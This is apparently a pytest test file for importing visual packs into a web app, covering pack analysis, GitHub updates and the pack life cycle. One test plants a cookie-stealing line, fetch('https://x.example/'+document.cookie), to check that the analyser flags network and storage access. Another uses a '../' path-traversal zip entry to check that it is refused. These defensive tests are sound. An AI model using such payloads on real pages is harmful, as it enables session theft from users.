"""issue 1 (POC): imported visual packs — the format, the analysis, the sources and the life of a pack."""

import io
import json
import shutil
import zipfile
from pathlib import Path
from typing import Any
from uuid import uuid4

import httpx
import pytest

from portalab.capabilities.catalog import new_registry
from portalab.capabilities.visuals import CATALOG_WRITER, external_looks
from portalab.core.authz_port import Principal
from portalab.core.errors import Conflict, NotFound
from portalab.modules.ui.looks import NotificationLooks
from portalab.modules.ui.themes.definition import validate_definition
from portalab.modules.ui.visuals.analysis import analyse
from portalab.modules.ui.visuals.github import GitHub, parse_address
from portalab.modules.ui.visuals.manifest import version_key
from portalab.modules.ui.visuals.service import VisualPackError, VisualPacks
from portalab.modules.ui.visuals.store import Files, PackageError, read_source, read_zip

EXAMPLE = Path(__file__).resolve().parents[4] / "examples" / "visual-packs" / "nordlys"
ADMIN = Principal(user_id=uuid4(), channel="user")


def _zip(files: dict[str, bytes | str], prefix: str = "") -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for name, data in files.items():
            archive.writestr(prefix + name, data)
    return buffer.getvalue()


def _pack(version: str = "1.0.0", **element: Any) -> dict[str, bytes | str]:
    base = {
        "type": "avatar_frame",
        "look": "tiny",
        "names": {"fr": "Petit", "en": "Tiny"},
        "render": {"kind": "css", "css": ["f.css"]},
        "economy": {"price": 400, "rarity": "rare"},
    }
    return {
        "pack.json": json.dumps(
            {"format": 1, "id": "tiny", "version": version, "names": {"fr": "T", "en": "T"}}
        ),
        "elements/frame/element.json": json.dumps({**base, **element}),
        "elements/frame/f.css": '.avatar-frame[data-frame="tiny"] { color: red; }',
    }


class FakeWriter:
    def __init__(self) -> None:
        self.products: dict[str, dict[str, Any]] = {}
        self.withdrawn: list[str] = []

    async def publish(self, actor: Principal, product: dict[str, Any]) -> str:
        outcome = "revised" if product["key"] in self.products else "created"
        self.products[product["key"]] = dict(product)
        return outcome

    async def withdraw(self, actor: Principal, key: str) -> None:
        self.withdrawn.append(key)


class FakeThemes:
    def __init__(self) -> None:
        self.rows: dict[str, Any] = {}

    async def get(self, key: str) -> Any:
        if key not in self.rows:
            raise NotFound("no theme")
        return self.rows[key]

    async def register(self, actor: Principal, document: dict[str, Any], *, source: str, owner: str) -> None:
        theme, errors = validate_definition(document)
        assert theme is not None, errors
        self.rows[document["key"]] = type("Row", (), {"source": source, "enabled": False, "doc": document})()

    async def update(
        self, actor: Principal, key: str, *, definition: Any = None, enabled: Any = None
    ) -> None:
        if enabled is not None:
            self.rows[key].enabled = enabled


@pytest.fixture(autouse=True)
def _no_external_looks() -> Any:
    yield
    external_looks.replace({})


def _service(root: Path) -> tuple[VisualPacks, FakeWriter, FakeThemes]:
    registry = new_registry()
    writer = FakeWriter()
    registry.provide(CATALOG_WRITER, writer, instance_ref="test", owner="test")
    themes = FakeThemes()
    return VisualPacks(root, registry, themes=themes), writer, themes


# --- the format and the analysis ----------------------------------------------------------------------------
def test_the_example_pack_is_publishable_and_flags_its_script_and_its_hd_looks() -> None:
    report = analyse(read_source(EXAMPLE))
    summary = report["summary"]
    assert summary["publishable"] and summary["hd"] and summary["script"]
    assert summary["elements"] == 12
    kinds = {e["product"]: e["kind"] for e in report["elements"]}
    assert kinds["levelup_nordlys"] == "glsl" and kinds["effect_nordlysglow"] == "js"
    assert kinds["theme_nordlys"] == "theme" and kinds["frame_fjordring"] == "css"
    assert [i["code"] for i in report["items"] if i["level"] != "info"] == ["js.script"]


@pytest.mark.parametrize(
    ("change", "code"),
    [
        ({"look": "gold"}, "look.builtin"),  # a built-in frame's key
        ({"render": {"kind": "js", "file": "f.js"}}, "render.kind"),  # a frame is not a script
        ({"render": {"kind": "css", "css": ["missing.css"]}}, "file.missing"),
        ({"economy": {"price": 10, "rarity": "mythic"}}, "economy.rarity"),
        ({"payload": {"priority": 1}}, "payload.fields"),
    ],
)
def test_blocking_findings(change: dict[str, Any], code: str) -> None:
    report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in _pack(**change).items()}))
    assert code in [i["code"] for i in report["items"] if i["level"] == "blocking"]
    assert not report["summary"]["publishable"]


def test_a_look_that_replaces_a_builtin_one_is_a_warning_and_css_must_aim_at_its_look() -> None:
    files = _pack(look="gold", replaces=True)
    files["elements/frame/f.css"] = 'body { color: red } .avatar-frame[data-frame="gold"] { color: red }'
    report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
    codes = {i["code"]: i["level"] for i in report["items"]}
    assert codes["look.replaces_builtin"] == "warning"
    assert codes["css.unscoped"] == "warning"


def test_js_and_glsl_contracts() -> None:
    files = _pack(type="effect", look="zap", render={"kind": "js", "file": "z.js"})
    files["elements/frame/z.js"] = "fetch('https://x.example/'+document.cookie)"
    report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
    codes = {i["code"] for i in report["items"]}
    assert {"js.no_export", "js.network", "js.storage"} <= codes
    files = _pack(type="level_up", look="zap", render={"kind": "glsl", "file": "z.glsl", "stage": True})
    files["elements/frame/z.glsl"] = "float out = 1.0;"
    report = analyse(Files({k: v.encode() if isinstance(v, str) else v for k, v in files.items()}))
    codes = {i["code"] for i in report["items"]}
    assert {"glsl.shape_contract", "glsl.reserved"} <= codes


def test_an_unsafe_zip_is_refused_and_a_github_archive_is_read_from_its_folder() -> None:
    with pytest.raises(PackageError):
        read_zip(_zip({"../evil.txt": "x", "pack.json": "{}"}))
    files = read_zip(_zip(_pack(), prefix="repo-main/packs/tiny/"), "packs/tiny")
    assert "pack.json" in files.entries and "elements/frame/f.css" in files.entries


def test_versions_order() -> None:
    assert version_key("1.10.0") > version_key("1.9.2") > version_key("1.9.2-rc1")
    assert version_key("1.0") == version_key("1.0.0")


# --- GitHub -----------------------------------------------------------------------------------------------
def test_github_addresses() -> None:
    assert parse_address("https://github.com/acme/looks").repo == "looks"
    repository = parse_address("https://github.com/acme/looks/tree/main/packs/tiny")
    assert (repository.ref, repository.folder) == ("main", "packs/tiny")


async def test_a_pack_from_github_offers_its_updates(tmp_path: Path) -> None:
    offered = {"version": "1.0.0"}

    def answer(request: httpx.Request) -> httpx.Response:
        url = str(request.url)
        if url.endswith("/releases/latest"):
            return httpx.Response(200, json={"tag_name": f"v{offered['version']}"})
        if "raw.githubusercontent.com" in url:
            return httpx.Response(200, content=_pack(offered["version"])["pack.json"])
        if "codeload.github.com" in url:
            return httpx.Response(200, content=_zip(_pack(offered["version"]), prefix="looks-1/"))
        return httpx.Response(404)

    service, _, _ = _service(tmp_path)
    service.github = GitHub(httpx.AsyncClient(transport=httpx.MockTransport(answer)))
    imported = await service.from_github("https://github.com/acme/looks")
    assert (imported.pack, imported.version) == ("tiny", "1.0.0")
    assert (await service.check_updates())[0]["update"] is False
    offered["version"] = "1.1.0"
    update = (await service.check_updates())[0]
    assert update["update"] is True and update["offered"] == "1.1.0"


# --- the life of a pack -----------------------------------------------------------------------------------
async def test_scan_validate_switch_off_and_roll_back(tmp_path: Path) -> None:
    service, writer, themes = _service(tmp_path)
    shutil.copytree(EXAMPLE, tmp_path / "inbox" / "nordlys")
    found = (await service.scan())["found"]
    assert found[0]["new"] and found[0]["pack"] == "nordlys"
    assert (await service.scan())["found"][0]["new"] is False  # read again: nothing new
    # a pack running scripts needs it said out loud
    with pytest.raises(VisualPackError):
        await service.approve(ADMIN, "nordlys", "1.0.0", {})
    economy = {"levelup_nordlys": {"price": 1800, "level": 30}}
    result = await service.approve(ADMIN, "nordlys", "1.0.0", economy, accept_script=True)
    assert result["products"]["levelup_nordlys"] == "created"
    product = writer.products["levelup_nordlys"]
    assert (product["price"], product["level"], product["rarity"]) == (1800, 30, "legendary")
    assert product["payload"] == {"animation": "nordlys"}
    assert writer.products["theme_nordlys"]["payload"] == {"theme": "nordlys"}
    assert themes.rows["nordlys"].enabled  # the interface is registered and switched on
    # the open vocabulary: the pack's looks are accepted by the preferences and listed with the built-in ones
    assert "nordlys" in external_looks.known("level_up") and "fjord" in external_looks.known("ambient")
    validator = NotificationLooks(new_registry()).validator("ui.levelUp")
    assert await validator("nordlys") == [] and await validator("nowhere") != []
    active = service.active()
    assert {e["product"] for e in active["elements"]} >= {"levelup_nordlys", "frame_nordlys"}
    level_up = next(e for e in active["elements"] if e["product"] == "levelup_nordlys")
    assert level_up["file"].startswith("/api/v1/visuals/files/nordlys/") and level_up["reveal"] == 2.4
    path = level_up["file"].split("/nordlys/", 1)[1].split("/", 1)
    assert service.served("nordlys", path[0], path[1], manager=False) is not None
    # switched off: its products leave the shop, its files are no longer served, the looks fall back
    await service.switch(ADMIN, "nordlys", False)
    assert "levelup_nordlys" in writer.withdrawn and not themes.rows["nordlys"].enabled
    assert service.served("nordlys", path[0], path[1], manager=False) is None
    assert service.served("nordlys", path[0], path[1], manager=True) is not None  # the sandbox still sees it
    assert "nordlys" not in external_looks.known("level_up") and service.active()["elements"] == []
    await service.switch(ADMIN, "nordlys", True)
    assert writer.products["levelup_nordlys"]["price"] == 1800  # the economy decided is kept
    # a new version without the badge: the badge leaves the shop; rolling back brings it back
    folder = tmp_path / "inbox" / "nordlys"
    meta = json.loads((folder / "pack.json").read_text())
    (folder / "pack.json").write_text(json.dumps({**meta, "version": "1.1.0"}))
    shutil.rmtree(folder / "elements" / "badge-aurora")
    await service.scan()
    await service.approve(ADMIN, "nordlys", "1.1.0", {}, accept_script=True)
    assert "badge_nordlys" in writer.withdrawn
    await service.rollback(ADMIN, "nordlys", "1.0.0")
    assert service.listing()[0]["current"] == "1.0.0"


async def test_a_published_version_is_never_changed_in_place_and_looks_are_not_shared(tmp_path: Path) -> None:
    service, _, _ = _service(tmp_path)
    first = await service.upload("tiny.zip", _zip(_pack()))
    await service.approve(ADMIN, first.pack, first.version, {})
    changed = _pack()
    changed["elements/frame/f.css"] = '.avatar-frame[data-frame="tiny"] { color: blue; }'
    with pytest.raises(Conflict):
        await service.upload("tiny.zip", _zip(changed))
    # another pack taking the same look is blocked at its analysis
    other = _pack()
    other["pack.json"] = json.dumps({"format": 1, "id": "other", "version": "1.0.0", "names": {"en": "O"}})
    imported = await service.upload("other.zip", _zip(other))
    codes = {i["code"] for i in service.detail(imported.pack, imported.version)["report"]["items"]}
    assert {"look.taken", "product.taken"} <= codes
